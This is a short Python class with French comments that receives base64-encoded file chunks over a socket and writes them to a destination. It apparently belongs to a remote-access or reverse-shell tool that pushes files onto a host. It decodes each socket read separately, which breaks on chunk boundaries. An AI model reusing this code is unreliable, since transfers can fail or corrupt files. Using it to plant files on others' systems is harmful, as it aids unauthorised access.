import os
import base64

class FileUpload:
    @staticmethod
    def upload(sock, destination):
        try:
            # Reçois le fichier en morceaux encodés en base64 et les write dans le fichier de destination
            with open(destination, 'wb') as file:
                while True:
                    data = sock.recv(4096)
                    if base64.b64decode(data) == b"EOF":
                        break
                    file.write(base64.b64decode(data))
            print(f"Fichier uploadé avec succès à {destination}.")
        except Exception as e:
            # Envoie un message d'erreur en cas de problème
            sock.sendall(base64.b64encode(f"[-] Erreur: {str(e)}".encode('utf-8')))
            print(f"[-] Erreur: {str(e)}")
